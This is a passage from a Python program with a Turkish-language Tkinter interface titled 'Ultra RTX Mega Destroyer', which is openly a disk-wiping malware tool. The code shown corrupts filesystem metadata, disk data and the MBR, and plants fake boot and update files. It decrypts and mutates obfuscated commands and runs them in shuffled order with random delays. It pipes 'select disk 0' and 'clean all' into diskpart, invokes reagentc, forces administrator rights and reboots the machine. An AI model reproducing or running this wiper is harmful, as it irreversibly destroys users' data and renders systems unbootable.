    status_label.config(text="Durum: Sahte Boot Dosyaları Oluşturma...")
    window.update()
    create_fake_boot_files(window, log_area)
    status_label.config(text="Durum: Sahte Update Dosyaları Oluşturma...")
    window.update()
    create_fake_update_files(window, log_area)
    status_label.config(text="Durum: Dosya Sistemi Bozma...")
    window.update()
    corrupt_filesystem_metadata(window, log_area)
    status_label.config(text="Durum: Disk Verileri Bozma...")
    window.update()
    corrupt_disk_data(window, log_area)
    if not efi_exists:
        status_label.config(text="Durum: MBR Bozma...")
        window.update()
        corrupt_mbr(window, log_area)
    
    cmd_list = list(commands.items())
    random.shuffle(cmd_list)
    for var, (enc_cmd, enc_key) in cmd_list:
        try:
            cmd = mutate_command(custom_decrypt(enc_cmd, enc_key))
            if not cmd:
                continue
            status_label.config(text=f"Durum: Komut Yürütülüyor: {cmd[:50]}...")
            window.update()
            if 'diskpart' in cmd:
                proc = subprocess.Popen(['diskpart'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, encoding='latin1')
                output, error = proc.communicate(input='select disk 0\nclean all\n', timeout=120)
                log_message(window, log_area, "Diskpart çalıştırıldı: clean all", operation="Diskpart")
                if error and "success" not in error.lower():
                    log_message(window, log_area, f"Hata: {error} (WinError: {ctypes.get_last_error()})", success=False, operation="Diskpart")
            elif 'X:' in cmd and not efi_exists:
                log_message(window, log_area, f"EFI bölümü olmadığından komut atlandı: {cmd}", success=False, operation="Komut Yürütme")
                continue
            elif 'reagentc' in cmd:
                result = subprocess.run(['cmd.exe', '/c', cmd], capture_output=True, timeout=15, encoding='latin1')
                log_message(window, log_area, f"Komut çalıştırıldı: {cmd}", operation="Komut Yürütme")
                if result.stderr and "success" not in result.stderr.lower():
                    log_message(window, log_area, f"Hata: {result.stderr} (WinError: {ctypes.get_last_error()})", success=False, operation="Komut Yürütme")
            else:
                result = subprocess.run(['cmd.exe', '/c', cmd], capture_output=True, timeout=15, encoding='latin1')
                log_message(window, log_area, f"Komut çalıştırıldı: {cmd}", operation="Komut Yürütme")
                if result.stderr and "success" not in result.stderr.lower():
                    log_message(window, log_area, f"Hata: {result.stderr} (WinError: {ctypes.get_last_error()})", success=False, operation="Komut Yürütme")
            time.sleep(random.uniform(5.0, 15.0))
        except (subprocess.SubprocessError, OSError, ValueError) as e:
            log_message(window, log_area, f"Hata: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Komut Yürütme")
    
    status_label.config(text="Durum: Yıkım Tamamlandı! Yeniden Başlatılıyor...")
    window.update()
    log_message(window, log_area, "Yıkım tamamlandı!", operation="Başlangıç")
    system_reboot(window, log_area)

# GUI oluşturma
def create_gui():
    """Tkinter ile GUI oluşturur."""
    window = tk.Tk()
    window.title("Ultra RTX Mega Destroyer")
    window.geometry("600x400")
    window.resizable(False, False)
    
    # Başlat butonu
    start_button = tk.Button(window, text="Başlat", font=("Arial", 14, "bold"), bg="red", fg="white", command=lambda: start_destruction(window, log_area, status_label))
    start_button.pack(pady=10)
    
    # Durum çubuğu
    status_label = tk.Label(window, text="Durum: Hazır", font=("Arial", 12))
    status_label.pack(pady=5)
    
    # Log alanı
    log_area = scrolledtext.ScrolledText(window, height=15, width=70, font=("Arial", 10))
    log_area.pack(pady=10)
    
    # Yönetici kontrolü
    run_as_admin()
    if not is_admin():
        log_message(window, log_area, "Hata: Yönetici haklarıyla çalıştırılması gerekiyor!", success=False, operation="Başlangıç")
        window.after(2000, window.destroy)
        return
    
    window.mainloop()

if _name_ == '_main_':
    create_gui()
    # Temizlik
    del commands
    sys.modules.clear()